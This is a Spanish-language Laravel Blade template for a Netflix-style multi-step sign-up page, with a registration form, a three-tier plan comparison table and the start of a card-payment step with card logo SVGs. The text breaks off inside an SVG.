@extends ('layouts.app')
@section('content')

    <script>
        $(document).ready(function () {

            $("#boton1").click(function(){

                $('#form1').toggle();
                $('#form2').toggle();

                cambiarimagen();


                $('#content').removeClass('form-register');
                $('#content').addClass('planFormContainer');
                $('#empty1').toggle();

                console.log($('#name').val());
            });
            $("#boton2").click(function(){

                $('#form2').toggle();
                $('#form3').toggle();

                cambiarimagen();


                $('#content').removeClass('planFormContainer');
                $('#content').addClass('form-register');
                $('#empty1').toggle();
            });

        })
        function cambiarimagen() {
            link = $('#imagen').attr('src');
            console.log(link);
            num=link.substr(-5,1);
            console.log(num);
            switch (num) {
                case "1":
                    code=link.replace(num,2);
                    console.log(code);
                    break;
                case "2":
                    code=link.replace(num,3);
                    console.log(code);
                    break;
                case "3":
                    code=link.replace(num,1);
                    console.log(code);
                    break;
            }
            $('#imagen').attr('src',code);

        }
    </script>

    <div class="emptyregisterspace" id="empty1"></div>


    <div class="form-register" id="content">

        <div class="stepicons"><img id="imagen" src="{{asset('backgrounds/stepplan1.svg')}}"></div>
        <form method="POST" name="register-form" action="{{ route('register') }}">

            @csrf
            @method('POST')

            <div class="registersection" id="form1">
                <label class="title-registro">Datos de registro</label>
                <div class="inputgroup">
                    <input required type="text" class="groupinput" name="name"  placeholder="Nombre"  id="name">
                    <input required type="text" class="groupinput" name="subname" placeholder="Apellidos"  id="subname">
                </div>
                <br><br>
                <input required id="email" type="email" class="forminputregister" name="email"  placeholder="Correo">
                <input required id="password" type="password" class="forminputregister" name="password" placeholder="Contraseña">
                <input required id="password-confirm" type="password" class="forminputregister" name="password_confirmation"  placeholder="Repetir contraseña">


                <input type="button" class="register-button" id="boton1"value="Continuar">

            </div>
            <div class="planFormContainer" data-uia="form-plan-selection" id="form2" style="display:none;">
                <div class="emptyspacetable" id="empty2"></div>
                <div>
                    <div class="stepHeader-container" data-uia="header">
                    </div>

                </div>
                <div class="planGrid planGrid--has3Plans" data-uia="plan-grid">
                    <div class="planGrid__header">
                        <div class="tarifas"></div>
                        <div class="planGrid__selector planGrid__planSelector" role="radiogroup" aria-label="Plan" aria-describedby="planGrid_planChoice_description" data-uia="plan-grid-plan-selector">
                            <span class="planGrid__selectorDescription" id="planGrid_planChoice_description" data-uia="plan-grid-plan-selector+description" aria-hidden="true">S
                                elecciona el plan que quieres tener
                            </span>
                            <label class="planGrid__selectorChoice planGrid__planChoice" for="planGrid_planChoice_0" data-uia="plan-grid-plan-selector+label-text_1_stream_name">
                                <input type="radio" name="planChoice" class="planGrid__selectorInput planGrid__planInput" id="planGrid_planChoice_0" data-uia="plan-grid-plan-selector+input-text_1_stream_name" value="1">
                                <span class="planGrid__selectorLabel planGrid__planLabel">
                                    Básica
                                </span>
                            </label>
                            <label class="planGrid__selectorChoice planGrid__planChoice" for="planGrid_planChoice_1" data-uia="plan-grid-plan-selector+label-text_2_stream_name">
                                <input type="radio" name="planChoice" class="planGrid__selectorInput planGrid__planInput" id="planGrid_planChoice_1" data-uia="plan-grid-plan-selector+input-text_2_stream_name" value="2">
                                <span class="planGrid__selectorLabel planGrid__planLabel">
                                    Estándar
                                </span>
                            </label>
                            <label class="planGrid__selectorChoice planGrid__planChoice" for="planGrid_planChoice_2" data-uia="plan-grid-plan-selector+label-text_4_stream_name">
                                <input type="radio" name="planChoice" class="planGrid__selectorInput planGrid__planInput" id="planGrid_planChoice_2" data-uia="plan-grid-plan-selector+input-text_4_stream_name" value="3" checked="">
                                <span class="planGrid__selectorLabel planGrid__planLabel">
                                    Premium
                                </span>
                            </label>
                        </div>
                    </div>
                    <table class="planGrid__featureTable">
                        <caption class="planGrid__featureTableCaption">Características del plan de Netflix</caption>
                        <tbody class="planGrid__featureTableBody" data-uia="plan-grid-feature-table-body">
                        <tr role="row" class="planGrid__featureTableRow">
                            <td class="planGrid__cell planGrid__featureCell" role="cell" data-uia="plan-grid-feature-table-cell+planPrice-feature">Precio mensual</td>
                            <td class="planGrid__cell planGrid__stringCell" role="cell" data-uia="plan-grid-feature-table-cell+planPrice-text_1_stream_name" aria-label="Básico">7&nbsp;€</td>
                            <td class="planGrid__cell planGrid__cell--isSelected planGrid__stringCell" role="cell" data-uia="plan-grid-feature-table-cell+planPrice-text_2_stream_name" aria-label="Estándar">11&nbsp;€</td>
                            <td class="planGrid__cell planGrid__stringCell" role="cell" data-uia="plan-grid-feature-table-cell+planPrice-text_4_stream_name" aria-label="Premium">15&nbsp;€</td>
                        </tr>
                        <tr role="row" class="planGrid__featureTableRow">
                            <td class="planGrid__cell planGrid__featureCell">Disponible en HD</td>
                            <td class="planGrid__cell planGrid__booleanCell" role="cell" data-uia="plan-grid-feature-table-cell+planHasHd-text_1_stream_name" aria-label="Básico"><span class="planGrid__booleanLabel">No</span><span class="planGrid__booleanIcon" aria-hidden="true"><svg id="thin-x" viewBox="0 0 26 26" class="svg-icon svg-icon-thin-x planGrid__booleanGraphic" focusable="true">
                                        <path d="M10.5 9.3L1.8 0.5 0.5 1.8 9.3 10.5 0.5 19.3 1.8 20.5 10.5 11.8 19.3 20.5 20.5 19.3 11.8 10.5 20.5 1.8 19.3 0.5 10.5 9.3Z"></path>
                                    </svg></span></td>
                            <td class="planGrid__cell planGrid__cell--isSelected planGrid__booleanCell" aria-label="Estándar"><span class="planGrid__booleanLabel">Sí</span><span class="planGrid__booleanIcon" aria-hidden="true"><svg id="thin-check" viewBox="0 0 26 26" class="svg-icon svg-icon-thin-check planGrid__booleanGraphic" focusable="true">
                                        <path d="M9.19 22.892L.5 14.198l1.232-1.233 7.236 7.24L23.793.516l1.38 1.04L9.19 22.892"></path>
                                    </svg></span></td>
                            <td class="planGrid__cell planGrid__booleanCell" role="cell" data-uia="plan-grid-feature-table-cell+planHasHd-text_4_stream_name" aria-label="Premium"><span class="planGrid__booleanLabel">Sí</span><span class="planGrid__booleanIcon" aria-hidden="true"><svg id="thin-check" viewBox="0 0 26 26" class="svg-icon svg-icon-thin-check planGrid__booleanGraphic" focusable="true">
                                        <path d="M9.19 22.892L.5 14.198l1.232-1.233 7.236 7.24L23.793.516l1.38 1.04L9.19 22.892"></path>
                                    </svg></span></td>
                        </tr>
                        <tr role="row" class="planGrid__featureTableRow">
                            <td class="planGrid__cell planGrid__featureCell" role="cell" data-uia="plan-grid-feature-table-cell+planHasUltraHd-feature">Disponible en Ultra HD</td>
                            <td class="planGrid__cell planGrid__booleanCell" role="cell" data-uia="plan-grid-feature-table-cell+planHasUltraHd-text_1_stream_name" aria-label="Básico"><span class="planGrid__booleanLabel">No</span><span class="planGrid__booleanIcon" aria-hidden="true"><svg id="thin-x" viewBox="0 0 26 26" class="svg-icon svg-icon-thin-x planGrid__booleanGraphic" focusable="true">
                                        <path d="M10.5 9.3L1.8 0.5 0.5 1.8 9.3 10.5 0.5 19.3 1.8 20.5 10.5 11.8 19.3 20.5 20.5 19.3 11.8 10.5 20.5 1.8 19.3 0.5 10.5 9.3Z"></path>
                                    </svg></span></td>
                            <td class="planGrid__cell planGrid__cell--isSelected planGrid__booleanCell" role="cell" data-uia="plan-grid-feature-table-cell+planHasUltraHd-text_2_stream_name" aria-label="Estándar"><span class="planGrid__booleanLabel">No</span><span class="planGrid__booleanIcon" aria-hidden="true"><svg id="thin-x" viewBox="0 0 26 26" class="svg-icon svg-icon-thin-x planGrid__booleanGraphic" focusable="true">
                                        <path d="M10.5 9.3L1.8 0.5 0.5 1.8 9.3 10.5 0.5 19.3 1.8 20.5 10.5 11.8 19.3 20.5 20.5 19.3 11.8 10.5 20.5 1.8 19.3 0.5 10.5 9.3Z"></path>
                                    </svg></span></td>
                            <td class="planGrid__cell planGrid__booleanCell" role="cell" data-uia="plan-grid-feature-table-cell+planHasUltraHd-text_4_stream_name" aria-label="Premium"><span class="planGrid__booleanLabel">Sí</span><span class="planGrid__booleanIcon" aria-hidden="true"><svg id="thin-check" viewBox="0 0 26 26" class="svg-icon svg-icon-thin-check planGrid__booleanGraphic" focusable="true">
                                        <path d="M9.19 22.892L.5 14.198l1.232-1.233 7.236 7.24L23.793.516l1.38 1.04L9.19 22.892"></path>
                                    </svg></span></td>
                        </tr>
                        <tr role="row" class="planGrid__featureTableRow">
                            <td class="planGrid__cell planGrid__featureCell" role="cell" data-uia="plan-grid-feature-table-cell+planMaxScreenCount-feature">Nº de pantallas que se pueden ver al mismo tiempo</td>
                            <td class="planGrid__cell planGrid__stringCell" role="cell" data-uia="plan-grid-feature-table-cell+planMaxScreenCount-text_1_stream_name" aria-label="Básico">1</td>
                            <td class="planGrid__cell planGrid__cell--isSelected planGrid__stringCell" role="cell" data-uia="plan-grid-feature-table-cell+planMaxScreenCount-text_2_stream_name" aria-label="Estándar">2</td>
                            <td class="planGrid__cell planGrid__stringCell" role="cell" data-uia="plan-grid-feature-table-cell+planMaxScreenCount-text_4_stream_name" aria-label="Premium">4</td>
                        </tr>
                        <tr role="row" class="planGrid__featureTableRow">
                            <td class="planGrid__cell planGrid__featureCell" role="cell" data-uia="plan-grid-feature-table-cell+4-feature">Multidispositivo: portátil, TV, teléfono y tableta</td>
                            <td class="planGrid__cell planGrid__booleanCell" role="cell" data-uia="plan-grid-feature-table-cell+4-text_1_stream_name" aria-label="Básico"><span class="planGrid__booleanLabel">Sí</span><span class="planGrid__booleanIcon" aria-hidden="true"><svg id="thin-check" viewBox="0 0 26 26" class="svg-icon svg-icon-thin-check planGrid__booleanGraphic" focusable="true">
                                        <path d="M9.19 22.892L.5 14.198l1.232-1.233 7.236 7.24L23.793.516l1.38 1.04L9.19 22.892"></path>
                                    </svg></span></td>
                            <td class="planGrid__cell planGrid__cell--isSelected planGrid__booleanCell" role="cell" data-uia="plan-grid-feature-table-cell+4-text_2_stream_name" aria-label="Estándar"><span class="planGrid__booleanLabel">Sí</span><span class="planGrid__booleanIcon" aria-hidden="true"><svg id="thin-check" viewBox="0 0 26 26" class="svg-icon svg-icon-thin-check planGrid__booleanGraphic" focusable="true">
                                        <path d="M9.19 22.892L.5 14.198l1.232-1.233 7.236 7.24L23.793.516l1.38 1.04L9.19 22.892"></path>
                                    </svg></span></td>
                            <td class="planGrid__cell planGrid__booleanCell" role="cell" data-uia="plan-grid-feature-table-cell+4-text_4_stream_name" aria-label="Premium"><span class="planGrid__booleanLabel">Sí</span><span class="planGrid__booleanIcon" aria-hidden="true"><svg id="thin-check" viewBox="0 0 26 26" class="svg-icon svg-icon-thin-check planGrid__booleanGraphic" focusable="true">
                                        <path d="M9.19 22.892L.5 14.198l1.232-1.233 7.236 7.24L23.793.516l1.38 1.04L9.19 22.892"></path>
                                    </svg></span></td>
                        </tr>
                        <tr role="row" class="planGrid__featureTableRow">
                            <td class="planGrid__cell planGrid__featureCell" role="cell" data-uia="plan-grid-feature-table-cell+5-feature">Todas las películas y series que desees</td>
                            <td class="planGrid__cell planGrid__booleanCell" role="cell" data-uia="plan-grid-feature-table-cell+5-text_1_stream_name" aria-label="Básico"><span class="planGrid__booleanLabel">Sí</span><span class="planGrid__booleanIcon" aria-hidden="true"><svg id="thin-check" viewBox="0 0 26 26" class="svg-icon svg-icon-thin-check planGrid__booleanGraphic" focusable="true">
                                        <path d="M9.19 22.892L.5 14.198l1.232-1.233 7.236 7.24L23.793.516l1.38 1.04L9.19 22.892"></path>
                                    </svg></span></td>
                            <td class="planGrid__cell planGrid__cell--isSelected planGrid__booleanCell" role="cell" data-uia="plan-grid-feature-table-cell+5-text_2_stream_name" aria-label="Estándar"><span class="planGrid__booleanLabel">Sí</span><span class="planGrid__booleanIcon" aria-hidden="true"><svg id="thin-check" viewBox="0 0 26 26" class="svg-icon svg-icon-thin-check planGrid__booleanGraphic" focusable="true">
                                        <path d="M9.19 22.892L.5 14.198l1.232-1.233 7.236 7.24L23.793.516l1.38 1.04L9.19 22.892"></path>
                                    </svg></span></td>
                            <td class="planGrid__cell planGrid__booleanCell" role="cell" data-uia="plan-grid-feature-table-cell+5-text_4_stream_name" aria-label="Premium"><span class="planGrid__booleanLabel">Sí</span><span class="planGrid__booleanIcon" aria-hidden="true"><svg id="thin-check" viewBox="0 0 26 26" class="svg-icon svg-icon-thin-check planGrid__booleanGraphic" focusable="true">
                                        <path d="M9.19 22.892L.5 14.198l1.232-1.233 7.236 7.24L23.793.516l1.38 1.04L9.19 22.892"></path>
                                    </svg></span></td>
                        </tr>
                        <tr role="row" class="planGrid__featureTableRow">
                            <td class="planGrid__cell planGrid__featureCell" role="cell" data-uia="plan-grid-feature-table-cell+6-feature">Cancela cuando quieras</td>
                            <td class="planGrid__cell planGrid__booleanCell" role="cell" data-uia="plan-grid-feature-table-cell+6-text_1_stream_name" aria-label="Básico"><span class="planGrid__booleanLabel">Sí</span><span class="planGrid__booleanIcon" aria-hidden="true"><svg id="thin-check" viewBox="0 0 26 26" class="svg-icon svg-icon-thin-check planGrid__booleanGraphic" focusable="true">
                                        <path d="M9.19 22.892L.5 14.198l1.232-1.233 7.236 7.24L23.793.516l1.38 1.04L9.19 22.892"></path>
                                    </svg></span></td>
                            <td class="planGrid__cell planGrid__cell--isSelected planGrid__booleanCell" role="cell" data-uia="plan-grid-feature-table-cell+6-text_2_stream_name" aria-label="Estándar"><span class="planGrid__booleanLabel">Sí</span><span class="planGrid__booleanIcon" aria-hidden="true"><svg id="thin-check" viewBox="0 0 26 26" class="svg-icon svg-icon-thin-check planGrid__booleanGraphic" focusable="true">
                                        <path d="M9.19 22.892L.5 14.198l1.232-1.233 7.236 7.24L23.793.516l1.38 1.04L9.19 22.892"></path>
                                    </svg></span></td>
                            <td class="planGrid__cell planGrid__booleanCell" role="cell" data-uia="plan-grid-feature-table-cell+6-text_4_stream_name" aria-label="Premium"><span class="planGrid__booleanLabel">Sí</span><span class="planGrid__booleanIcon" aria-hidden="true"><svg id="thin-check" viewBox="0 0 26 26" class="svg-icon svg-icon-thin-check planGrid__booleanGraphic" focusable="true">
                                        <path d="M9.19 22.892L.5 14.198l1.232-1.233 7.236 7.24L23.793.516l1.38 1.04L9.19 22.892"></path>
                                    </svg></span></td>
                        </tr>
                        </tbody>
                    </table><small class="planGrid__legal"><span id="" data-uia="plan-grid-legal">La disponibilidad de contenido en HD y en Ultra HD depende de la capacidad de tu servicio de internet y del dispositivo.</span></small>
                </div>
                <div class="buttonchoseplan">

                    <input type="button" class="continue" value="continuar" id="boton2">

                </div>
            </div>
            <div id="form3" style="display:none;">


                <h1 class="title">Configura tu tarjeta de crédito o débito</h1>

                <div class="metodos">
                    <svg class="tarjeta" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 512 512" width="40px" style="enable-background:new 0 0 512 512;" xml:space="preserve">
                    <path style="fill:#FFFFFF;" d="M512,402.281c0,16.716-13.55,30.267-30.265,30.267H30.265C13.55,432.549,0,418.997,0,402.281V109.717
	c0-16.716,13.55-30.266,30.265-30.266h451.47c16.716,0,30.265,13.551,30.265,30.266V402.281L512,402.281z" />
                        <path style="fill:#F79F1A;" d="M113.64,258.035l-12.022-57.671c-2.055-7.953-8.035-10.319-15.507-10.632H30.993l-0.491,2.635
	C73.431,202.774,101.836,227.88,113.64,258.035z" />
                        <g>
                            <polygon style="fill:#059BBF;" points="241.354,190.892 205.741,190.892 183.499,321.419 219.053,321.419 	" />
                            <path style="fill:#059BBF;" d="M135.345,321.288l56.01-130.307h-37.691l-34.843,89.028l-3.719-13.442
		c-6.83-16.171-26.35-39.446-49.266-54.098l31.85,108.863L135.345,321.288z" />
                            <path style="fill:#059BBF;" d="M342.931,278.75c0.132-14.819-9.383-26.122-29.887-35.458c-12.461-6.03-20.056-10.051-19.965-16.17
		c0-5.406,6.432-11.213,20.368-11.213c11.661-0.179,20.057,2.367,26.624,5.003l3.218,1.475l4.826-28.277
		c-7.059-2.637-18.094-5.451-31.895-5.451c-35.157,0-59.904,17.691-60.128,43.064c-0.224,18.763,17.692,29.216,31.181,35.469
		c13.847,6.374,18.493,10.453,18.404,16.171c-0.089,8.743-11.035,12.73-21.264,12.73c-14.25,0-21.8-1.965-33.509-6.843l-4.55-2.09
		l-4.998,29.249c8.303,3.629,23.668,6.801,39.618,6.933C318.361,323.342,342.663,305.876,342.931,278.75z" />
                            <path style="fill:#059BBF;" d="M385.233,301.855c4.065,0,40.382,0.045,45.566,0.045c1.072,4.545,4.333,19.565,4.333,19.565h33.011
		L439.33,191.027h-27.472c-8.533,0-14.874,2.323-18.628,10.809l-52.845,119.629h37.392
		C377.774,321.465,383.848,305.386,385.233,301.855z M409.622,238.645c-0.176,0.357,2.95-7.549,4.737-12.463l2.411,11.256
		c0,0,6.792,31.182,8.22,37.704h-29.528C398.411,267.638,409.622,238.645,409.622,238.645z" />
                            <path style="fill:#059BBF;" d="M481.735,79.451H30.265C13.55,79.451,0,93.001,0,109.717v31.412h512v-31.412
		C512,93.001,498.451,79.451,481.735,79.451z" />
                        </g>
                        <path style="fill:#F79F1A;" d="M481.735,432.549H30.265C13.55,432.549,0,418.998,0,402.283v-31.412h512v31.412
	C512,418.998,498.451,432.549,481.735,432.549z" />
                        <path style="opacity:0.15;fill:#202121;enable-background:new    ;" d="M21.517,402.281V109.717
	c0-16.716,13.551-30.266,30.267-30.266h-21.52C13.55,79.451,0,93.001,0,109.717v292.565c0,16.716,13.55,30.267,30.265,30.267h21.52
	C35.069,432.549,21.517,418.997,21.517,402.281z" />
                        <g>
                        </g>
                        <g>
                        </g>
                        <g>
                        </g>
                        <g>
                        </g>
                        <g>
                        </g>
                        <g>
                        </g>
                        <g>
                        </g>
                        <g>
                        </g>
                        <g>
                        </g>
                        <g>
                        </g>
                        <g>
                        </g>
                        <g>
                        </g>
                        <g>
                        </g>
                        <g>
                        </g>
                        <g>
                        </g>
                </svg>

                    <svg class="tarjeta" xmlns="http://www.w3.org/2000/svg" version="1.1" viewBox="0 -77 512.00003 512" width="40px">
                        <g id="surface1">
                            <path d="M 512 45.59375 L 512 313.273438 C 512 338.410156 491.542969 358.867188 466.40625 358.867188 L 45.59375 358.867188 C 20.457031 358.867188 0 338.410156 0 313.273438 L 0 45.59375 C 0 20.457031 20.457031 0 45.59375 0 L 466.40625 0 C 491.542969 0 512 20.457031 512 45.59375 Z M 512 45.59375 " style=" stroke:none;fill-rule:nonzero;fill:rgb(74.509804%,92.156863%,98.039216%);fill-opacity:1;" />
                            <path d="M 512 45.59375 L 512 313.273438 C 512 338.410156 491.542969 358.867188 466.40625 358.867188 L 256 358.867188 L 256 0 L 466.40625 0 C 491.542969 0 512 20.457031 512 45.59375 Z M 512 45.59375 " style=" stroke:none;fill-rule:nonzero;fill:rgb(61.960784%,88.627451%,97.254902%);fill-opacity:1;" />
                            <path d="M 316.800781 62.929688 C 252.5625 62.929688 200.296875 115.195312 200.296875 179.433594 C 200.296875 243.675781 252.5625 295.9375 316.800781 295.9375 C 381.042969 295.9375 433.304688 243.675781 433.304688 179.433594 C 433.304688 115.195312 381.042969 62.929688 316.800781 62.929688 Z M 316.800781 62.929688 " style=" stroke:none;fill-rule:nonzero;fill:rgb(100%,89.411765%,46.666667%);fill-opacity:1;" />
                            <path d="M 195.199219 62.929688 C 130.957031 62.929688 78.695312 115.195312 78.695312 179.433594 C 78.695312 243.675781 130.957031 295.9375 195.199219 295.9375 C 259.4375 295.9375 311.703125 243.675781 311.703125 179.433594 C 311.703125 115.195312 259.4375 62.929688 195.199219 62.929688 Z M 195.199219 62.929688 " style=" stroke:none;fill-rule:nonzero;fill:rgb(100%,39.215686%,14.901961%);fill-opacity:1;" />
                            <path d="M 311.703125 179.433594 C 311.703125 221.410156 289.394531 258.269531 256 278.777344 C 222.605469 258.269531 200.296875 221.410156 200.296875 179.433594 C 200.296875 137.457031 222.605469 100.597656 256 80.09375 C 289.394531 100.597656 311.703125 137.457031 311.703125 179.433594 Z M 311.703125 179.433594 " style=" stroke:none;fill-rule:nonzero;fill:rgb(100%,58.039216%,41.568627%);fill-opacity:1;" />
                        </g>
                    </svg>


                    <svg class="tarjeta" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" width="40px" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 512 512" style="enable-background:new 0 0 512 512;" xml:space="preserve">
                    <path style="fill:#306FC5;" d="M512,402.281c0,16.716-13.55,30.267-30.265,30.267H30.265C13.55,432.549,0,418.997,0,402.281V109.717
	c0-16.715,13.55-30.266,30.265-30.266h451.47c16.716,0,30.265,13.551,30.265,30.266V402.281L512,402.281z" />
                        <path style="opacity:0.15;fill:#202121;enable-background:new    ;" d="M21.517,402.281V109.717
	c0-16.715,13.552-30.266,30.267-30.266h-21.52C13.55,79.451,0,93.001,0,109.717v292.565c0,16.716,13.55,30.267,30.265,30.267h21.52
	C35.07,432.549,21.517,418.997,21.517,402.281z" />
                        <g>
                            <polygon style="fill:#FFFFFF;" points="74.59,220.748 89.888,220.748 82.241,201.278 	" />
                            <polygon style="fill:#FFFFFF;" points="155.946,286.107 155.946,295.148 181.675,295.148 181.675,304.885 155.946,304.885
		155.946,315.318 184.455,315.318 197.666,300.712 185.151,286.107 	" />
                            <polygon style="fill:#FFFFFF;" points="356.898,201.278 348.553,220.748 364.548,220.748 	" />
                            <polygon style="fill:#FFFFFF;" points="230.348,320.875 230.348,281.241 212.268,300.712 	" />
                            <path style="fill:#FFFFFF;" d="M264.42,292.368c-0.696-4.172-3.48-6.261-7.654-6.261h-14.599v12.516h15.299
		C261.637,298.624,264.42,296.539,264.42,292.368z" />
                            <path style="fill:#FFFFFF;" d="M313.09,297.236c1.391-0.697,2.089-2.785,2.089-4.867c0.696-2.779-0.698-4.172-2.089-4.868
		c-1.387-0.696-3.476-0.696-5.559-0.696h-13.91v11.127h13.909C309.613,297.932,311.702,297.932,313.09,297.236z" />
                            <path style="fill:#FFFFFF;" d="M413.217,183.198v8.344l-4.169-8.344H376.37v8.344l-4.174-8.344h-44.502
		c-7.648,0-13.909,1.392-19.469,4.173v-4.173h-31.289v0.696v3.477c-3.476-2.78-7.648-4.173-13.211-4.173h-111.95l-7.652,17.384
		l-7.647-17.384h-25.031h-10.431v8.344l-3.477-8.344h-0.696H66.942l-13.909,32.68L37.042,251.34l-0.294,0.697h0.294h35.463h0.444
		l0.252-0.697l4.174-10.428h9.039l4.172,11.125h40.326v-0.697v-7.647l3.479,8.343h20.163l3.475-8.343v7.647v0.697h15.993h79.965
		h0.696v-18.08h1.394c1.389,0,1.389,0,1.389,2.087v15.297h50.065v-4.172c4.172,2.089,10.426,4.172,18.771,4.172h20.863l4.172-11.123
		h9.732l4.172,11.123h40.328v-6.952v-3.476l6.261,10.428h1.387h0.698h30.595v-68.143h-31.291l0,0H413.217z M177.501,241.609h-6.955
		h-4.171v-4.169v-34.076l-0.696,1.595v-0.019l-16.176,36.669h-0.512h-3.719h-6.017l-16.687-38.245v38.245h-23.64l-4.867-10.43
		H70.417l-4.868,10.43H53.326l20.57-48.675h17.382l19.469,46.587v-46.587h4.171h14.251l0.328,0.697h0.024l8.773,19.094l6.3,14.306
		l0.223-0.721l13.906-33.375H177.5v48.674H177.501L177.501,241.609z M225.481,203.364h-27.119v9.039h26.423v9.734h-26.423v9.738
		h27.119v10.427h-38.939v-49.367h38.939V203.364L225.481,203.364z M275.076,221.294c0.018,0.016,0.041,0.027,0.063,0.042
		c0.263,0.278,0.488,0.557,0.68,0.824c1.332,1.746,2.409,4.343,2.463,8.151c0.004,0.066,0.007,0.131,0.011,0.197
		c0,0.038,0.007,0.071,0.007,0.11c0,0.022-0.002,0.039-0.002,0.06c0.016,0.383,0.026,0.774,0.026,1.197v9.735h-10.428v-5.565
		c0-2.781,0-6.954-2.089-9.735c-0.657-0.657-1.322-1.09-2.046-1.398c-1.042-0.675-3.017-0.686-6.295-0.686h-12.52v17.384h-11.818
		v-48.675h26.425c6.254,0,10.428,0,13.906,2.086c3.407,2.046,5.465,5.439,5.543,10.812c-0.161,7.4-4.911,11.46-8.326,12.829
		C270.676,218.662,272.996,219.129,275.076,221.294z M298.491,241.609h-11.822v-48.675h11.822V241.609z M434.083,241.609h-15.3
		l-22.25-36.855v30.595l-0.073-0.072v6.362h-11.747v-0.029h-11.822l-4.172-10.43H344.38l-4.172,11.123h-13.211
		c-5.559,0-12.517-1.389-16.687-5.561c-4.172-4.172-6.256-9.735-6.256-18.773c0-6.953,1.389-13.911,6.256-19.472
		c3.474-4.175,9.735-5.562,17.382-5.562h11.128v10.429h-11.128c-4.172,0-6.254,0.693-9.041,2.783
		c-2.082,2.085-3.474,6.256-3.474,11.123c0,5.564,0.696,9.04,3.474,11.821c2.091,2.089,4.87,2.785,8.346,2.785h4.867l15.991-38.243
		h6.957h10.428l19.472,46.587v-2.376v-15.705v-1.389v-27.116h17.382l20.161,34.07v-34.07h11.826v47.977h0.002L434.083,241.609
		L434.083,241.609z" />
                            <path style="fill:#FFFFFF;" d="M265.161,213.207c0.203-0.217,0.387-0.463,0.543-0.745c0.63-0.997,1.352-2.793,0.963-5.244
		c-0.016-0.225-0.057-0.433-0.105-0.634c-0.013-0.056-0.011-0.105-0.026-0.161l-0.007,0.001c-0.346-1.191-1.229-1.923-2.11-2.367
		c-1.394-0.693-3.48-0.693-5.565-0.693h-13.909v11.127h13.909c2.085,0,4.172,0,5.565-0.697c0.209-0.106,0.395-0.25,0.574-0.413
		l0.002,0.009C264.996,213.389,265.067,213.315,265.161,213.207z" />
                            <path style="fill:#FFFFFF;" d="M475.105,311.144c0-4.867-1.389-9.736-3.474-13.212v-31.289h-0.032v-2.089c0,0-29.145,0-33.483,0
		c-4.336,0-9.598,4.171-9.598,4.171v-4.171h-31.984c-4.87,0-11.124,1.392-13.909,4.171v-4.171h-57.016v2.089v2.081
		c-4.169-3.474-11.824-4.171-15.298-4.171h-37.549v2.089v2.081c-3.476-3.474-11.824-4.171-15.998-4.171H215.05l-9.737,10.431
		l-9.04-10.431h-2.911h-4.737h-54.93v2.089v5.493v62.651h61.19l10.054-10.057l8.715,10.057h0.698h35.258h1.598h0.696h0.692v-6.953
		v-9.039h3.479c4.863,0,11.124,0,15.991-2.089v17.382v1.394h31.291v-1.394V317.4h1.387c2.089,0,2.089,0,2.089,2.086v14.6v1.394
		h94.563c6.263,0,12.517-1.394,15.993-4.175v2.781v1.394h29.902c6.254,0,12.517-0.695,16.689-3.478
		c6.402-3.841,10.437-10.64,11.037-18.749c0.028-0.24,0.063-0.48,0.085-0.721l-0.041-0.039
		C475.087,312.043,475.105,311.598,475.105,311.144z M256.076,306.973h-13.91v2.081v4.174v4.173v7.649h-22.855l-13.302-15.299
		l-0.046,0.051l-0.65-0.748l-15.297,15.996h-44.501v-48.673h45.197l12.348,13.525l2.596,2.832l0.352-0.365l14.604-15.991h36.852
		c7.152,0,15.161,1.765,18.196,9.042c0.365,1.441,0.577,3.043,0.577,4.863C276.237,304.189,266.502,306.973,256.076,306.973z
		 M325.609,306.276c1.389,2.081,2.085,4.867,2.085,9.041v9.732h-11.819v-6.256c0-2.786,0-7.65-2.089-9.739
		c-1.387-2.081-4.172-2.081-8.341-2.081H292.93v18.077h-11.82v-49.369h26.421c5.559,0,10.426,0,13.909,2.084
		c3.474,2.088,6.254,5.565,6.254,11.128c0,7.647-4.865,11.819-8.343,13.212C322.829,303.49,324.914,304.885,325.609,306.276z
		 M373.589,286.107h-27.122v9.04h26.424v9.737h-26.424v9.736h27.122v10.429H334.65V275.68h38.939V286.107z M402.791,325.05h-22.252
		v-10.429h22.252c2.082,0,3.476,0,4.87-1.392c0.696-0.697,1.387-2.085,1.387-3.477c0-1.394-0.691-2.778-1.387-3.475
		c-0.698-0.695-2.091-1.391-4.176-1.391c-11.126-0.696-24.337,0-24.337-15.296c0-6.954,4.172-14.604,16.689-14.604h22.945v11.819
		h-21.554c-2.085,0-3.478,0-4.87,0.696c-1.387,0.697-1.387,2.089-1.387,3.478c0,2.087,1.387,2.783,2.778,3.473
		c1.394,0.697,2.783,0.697,4.172,0.697h6.259c6.259,0,10.43,1.391,13.211,4.173c2.087,2.087,3.478,5.564,3.478,10.43
		C420.869,320.179,414.611,325.05,402.791,325.05z M462.59,320.179c-2.778,2.785-7.648,4.871-14.604,4.871H425.74v-10.429h22.245
		c2.087,0,3.481,0,4.87-1.392c0.693-0.697,1.391-2.085,1.391-3.477c0-1.394-0.698-2.778-1.391-3.475
		c-0.696-0.695-2.085-1.391-4.172-1.391c-11.122-0.696-24.337,0-24.337-15.295c0-6.609,3.781-12.579,13.106-14.352
		c1.115-0.154,2.293-0.253,3.583-0.253h22.948v11.819h-15.3h-5.561h-0.696c-2.087,0-3.476,0-4.865,0.696
		c-0.7,0.697-1.396,2.089-1.396,3.478c0,2.087,0.696,2.783,2.785,3.473c1.389,0.697,2.78,0.697,4.172,0.697h0.691h5.565
		c3.039,0,5.337,0.375,7.44,1.114c1.926,0.697,8.302,3.549,9.728,10.994c0.124,0.78,0.215,1.594,0.215,2.495
		C466.761,313.925,465.37,317.401,462.59,320.179z" />
                        </g>
                        <g>
                        </g>
                        <g>
                        </g>
                        <g>
                        </g>
                        <g>
                        </g>
                        <g>
                        </g>
                        <g>
                        </g>
                        <g>
                        </g>
                        <g>
                        </g>
                        <g>
                        </g>
                        <g>
                        </g>
                        <g>
                        </g>
                        <g>
                        </g>
                        <g>
                        </g>
                        <g>
                        </g>
                        <g></g>
                </svg>

                    <p class="security">Servidor seguro

                        <svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 512 512" width="20px" color="#FEC418" xml:space="preserve">
                        <g>
                            <g>
